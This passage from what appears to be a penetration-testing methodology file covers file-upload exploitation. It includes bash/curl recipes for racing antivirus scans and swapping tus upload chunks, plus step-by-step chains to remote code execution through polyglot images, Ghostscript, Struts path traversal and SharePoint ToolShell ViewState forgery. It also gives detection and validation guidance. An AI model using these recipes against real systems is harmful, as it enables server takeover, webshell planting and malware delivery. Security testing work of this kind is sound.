# the embedded eval payload fires in-process (not spawned).
```

**Confirmation signal.** The exiftool process produces output or side effects (outbound DNS, file write to `/tmp/exif-poc`) consistent with the embedded Perl payload, not with normal metadata reading. The process's `strace` log shows syscalls — `write`, `connect`, `execve` — that bare metadata parsing should not produce.

**Impact.** Full RCE as the exiftool process user on upload-pipeline hosts, from any upload surface that reads metadata. The exploitation path is attractive because exiftool is often invoked synchronously on upload (for thumbnail orientation, timezone normalization) with the file content immediately available. Routes to `rce.md` for the shell-establishment surface and to the base's Toolchain Exploits section for the one-line class-shape.

## Processing Race Primitives

**Primitive.** Multi-step upload pipelines produce transient states where an uploaded file is accessible before validation completes: between upload and AV scan, between upload and thumbnail generation, between resumable-upload init and complete, between PUT and move-to-final-path. A request to the transient path during the window retrieves the raw file; a request after the move succeeds retrieves the sanitized file. The attacker widens the window by uploading large files (slow AV), by chunking slowly (slow finalize), or by triggering CPU-expensive conversions (slow thumbnail).

**Preconditions.** All of: (i) the pipeline has at least two stages separated by observable state; (ii) at least one intermediate stage exposes the file at a predictable path (`/uploads/pending/<id>`, `/tmp/upload-<id>.part`, `/.../scan-queue/<id>`); (iii) the attacker can enumerate the predictable path OR observe it from the upload response.

**Attack recipe.**

```bash
# AV race: upload a known-detectable payload wrapped in a slow-to-scan container,
# then race the AV scan with a GET on the pending path:
curl -F 'file=@large-polyglot.zip' 'https://target/upload' &
UPLOAD_PID=$!
# response includes {id: "abc123", status: "pending"}
while :; do
  curl -s -o /dev/null -w "%{http_code}\n" 'https://target/uploads/pending/abc123'
  # 200 → file is live-reachable; AV hasn't quarantined yet. Pull it:
  curl 'https://target/uploads/pending/abc123' -o live-copy
  break
done
wait $UPLOAD_PID
```

For the chunked-upload-swap variant, the attacker uploads legitimate chunks, requests the pre-complete access path, and swaps content on finalize:

```bash
# tus: PATCH chunks 1..n-1 with safe content, request pre-finalize access, PATCH chunk n with payload
curl -X PATCH -H 'Upload-Offset: 0' --data-binary @safe-chunk 'https://target/tus/<id>'
curl 'https://target/preview/<id>'   # response is based on safe chunks (preview is pre-finalize)
curl -X PATCH -H 'Upload-Offset: <offset>' --data-binary @payload-chunk 'https://target/tus/<id>'
# finalization is now the payload; the preview URL cached the safe version.
```

**Confirmation signal.** The transient-path response returns the attacker's payload bytes; the final-path response returns the sanitized bytes (or 404 after quarantine). The race window's duration is measurable — a timing probe reveals the AV scan or thumbnail generation duration, which the attacker tunes payload size to widen.

**Impact.** Access to pre-scan payloads for direct serving (stored XSS, malware delivery) and for downstream pipelines that consume the pre-finalize state (preview generators, content classifiers). Combined with the chunk-swap variant, converts a post-scan-clean upload into a serving-time malicious file. Routes to `race_conditions.md § TOCTOU` for the general race framing.

## Chaining Surface

**Upstream primitives (what grants an upload surface):** `reconnaissance/*` enumeration surfaces upload endpoints; `broken_function_level_authorization.md` grants access to admin upload paths (bulk importers, template uploads); `idor.md` grants access to upload sinks belonging to other tenants.

**Downstream capabilities (what upload exploitation grants):**

- `rce.md` — polyglot + per-server execution primitive = direct code execution; engine-RCE (ImageMagick / Ghostscript / exiftool) = code execution during conversion; file-write + handler-shim (`.htaccess`, `web.config`) = post-upload code execution.
- `xss.md` — stored XSS via SVG renderer-differential, HTML upload served inline, bucket-origin inline HTML via S3 POST policy abuse.
- `xxe.md` — SVG-reaches-XML-parser path via server-side rendering; metadata parsers that reach XML sinks.
- `path_traversal_lfi_rfi.md` — Zip-Slip and symlink-in-archive write to arbitrary paths; filter-chain exploitation of upload paths converts non-executable uploads into RCE through LFI.
- `insecure_deserialization.md` — SharePoint ToolShell's dropped `.aspx` leaks MachineKey, which the attacker uses to forge `__VIEWSTATE` for full RCE; the file-upload primitive is the delivery, the deserialization is the execution.
- `ssrf.md` — SVG `<image href>` to internal URLs; XXE OOB via SVG; HTTPS coder in ImageMagick delegates to SSRF.
- `subdomain_takeover.md § CDN Cache Poisoning` — bucket-origin inline content can be cached under a trusted CDN host.

**Composite chains, routed by filename:**

1. **Polyglot upload → nginx path-info → RCE.** Build GIF+PHP polyglot; upload through the avatar sink that validates magic bytes; request the stored path with trailing `/x.php`; the FastCGI location executes the PHP in the image. One upload, one request, RCE. Routes to `rce.md`.

2. **ImageMagick EPS-as-JPG → Ghostscript uniprint format-string → `%pipe%` RCE.** Build an EPS file with a `.jpg` extension that triggers ImageMagick's PS delegate; the delegate shells to Ghostscript; the EPS content contains the uniprint format-string payload that flips `path_control_active`; a `%pipe%` command in the same file executes OS commands. See `insecure_file_uploads_novel_deep.md § Ghostscript uniprint Format-String Sandbox Escape` for the version boundary.

3. **Struts top.fileFileName → webroot file write → RCE.** Multipart POST with `top.fileFileName=../../ROOT/shell.jsp`; the ParametersInterceptor assigns the path via OGNL; a JSP shell lands in the webroot; a sibling GET executes it. Routes to `rce.md`. See `insecure_file_uploads_novel_deep.md § Struts top.fileFileName Mass-Assignment Primitive`.

4. **SharePoint ToolShell POST → MachineKey leak → `__VIEWSTATE` RCE.** Unauth POST to `/_layouts/15/ToolPane.aspx?DisplayMode=Edit` + spoofed `Referer`; aspx shell drops to webroot; shell exfiltrates MachineKey; attacker forges `__VIEWSTATE` with `ysoserial.net`; the forged ViewState triggers full RCE. The *delivery/activation* is file-upload; the *full RCE* routes to `insecure_deserialization.md § ASP.NET ViewState Forgery`.

5. **S3 POST policy abuse → bucket-origin inline HTML → CSP-trust XSS.** Discover unconstrained Content-Type and Content-Disposition in the signing policy; upload HTML with inline Content-Disposition; the parent app's CSP allowlists `*.s3.amazonaws.com`; the uploaded HTML executes in parent-origin context. Routes to `xss.md` and `subdomain_takeover_advanced_deep.md § CSP script-src Gadget`.

## Detection and Confirmation Methodology

- **Pipeline-stage probes.** Upload a tiny probe of each candidate type and record the full chain of HTTP responses: upload response, download response, thumbnail response, preview response, scan-status response. Diff the Content-Type and Content-Disposition at each stage; the stages where they diverge are the primitives.
- **Validator vs consumer differential.** Fingerprint the specific validator (library + version via error messages, response structure, timing fingerprints) and the specific consumer (via rendered output's EXIF, image library signatures, PDF producer strings). A validator-consumer mismatch is a differential class candidate.
- **Serving-origin inventory.** For bucket-serving flows, enumerate every origin that serves the uploaded content: direct bucket, CloudFront/Fastly in front, parent app's reverse-proxy, email-attachment serving. Each origin may apply different Content-Type / Content-Disposition rules; the weakest wins.
- **Per-server fingerprint.** Identify the serving stack precisely — `curl -I` for `Server:`, response-timing fingerprints for FPM vs mod_php, header-order fingerprints for IIS version — then pick the matching primitive from the base's per-server execution table.
- **AV-race timing.** Measure the gap between upload-accept and AV-scan-complete by uploading a large file and polling the status endpoint; the gap duration is the race window. Payloads sized to widen the window are a legitimate exploitation step.

## False-Positive Discipline

- **"Upload accepted" is not "upload exploitable."** The pipeline may store the file privately, serve it as attachment with nosniff, or scan+quarantine before any downstream consumer touches it. Prove at least one chain primitive fires before escalating severity.
- **Validator rejection does not close the primitive.** A validator that rejects on magic-byte alone is defeated by polyglots; a validator that rejects on extension alone is defeated by alias extensions; validator rejection is one specific validator in one specific state.
- **Engine-RCE requires the engine.** CVE-2024-29510 Ghostscript requires the GS version in the vulnerable range AND an upload pipeline that actually invokes GS. An upload-only surface with no document conversion is not reachable; prove the conversion step before citing the CVE.
- **ToolShell delivery is not full RCE.** The CVE-2025-53770 delivery/activation primitive drops a shell; full RCE requires the shell to leak MachineKey and the attacker to forge `__VIEWSTATE`. Report the delivery primitive separately from the deserialization chain; the full chain is a composite finding (route to `insecure_deserialization.md`).
- **Struts top.fileFileName primitive is specific.** The CVE-2024-53677 primitive is `top.*` OGNL mass-assignment via multipart; the "undocumented top keyword" and "entire 2.0.0–6.x range" framings from early reports are refuted and must not be imported. Report the primitive mechanism (OGNL value-stack access via the ParametersInterceptor) and route to `insecure_file_uploads_novel_deep.md` for the version boundary.

## Validation

- Reproduce one chain primitive end-to-end against a controlled upload target; the chain primitive is the finding, the upload is the delivery.
- Preserve the exact upload HTTP request (including multipart boundary, chunk structure, policy fields) and the exact subsequent request that triggered the primitive. The chain is reproducible from both artifacts.
- Capture the serving stack's version evidence (`Server:` header, `X-Powered-By`, response-time fingerprints) so the reader can confirm the version-boundary conditions hold for the deployment.
- For engine-RCE findings, capture the engine's version evidence (`gs --version`, `convert --version`, `exiftool -ver`) when the deployment permits reading it, or infer from the engine's error-page strings and timing fingerprints.

## Summary

Advanced upload exploitation is server-and-engine-pair exploitation: the per-server primitive (Nginx path-info, Apache MultiViews, IIS web.config, Tomcat PUT) and the engine primitive (ImageMagick coders, Ghostscript pipe/format-string, exiftool eval) together determine which upload reaches which code path. The polyglot and parser-differential classes defeat validator-only defenses; the archive-attack family and the cloud-storage signed-field classes defeat perimeter policies; the processing-race family defeats time-separated validation. Each primitive is a full P/P/A/C/I treatment with explicit chain pointers to the siblings that own the downstream capability — RCE, XSS, XXE, LFI, deserialization, SSRF — because the chain, not the upload, is the impact.
